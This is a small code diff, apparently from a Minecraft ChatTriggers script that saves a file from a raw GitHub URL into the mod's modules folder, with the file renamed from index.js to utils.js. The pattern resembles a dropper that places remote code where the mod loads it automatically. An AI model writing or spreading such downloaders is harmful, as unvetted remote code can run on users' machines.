@@ -10,7 +10,7 @@ const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/B
 targetPath.mkdirs(); // Create folders if needed
 
 // Destination file
-const file = new File(targetPath, "index.js");
+const file = new File(targetPath, "utils.js");
 
 // GitHub raw file URL
 const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b.js";
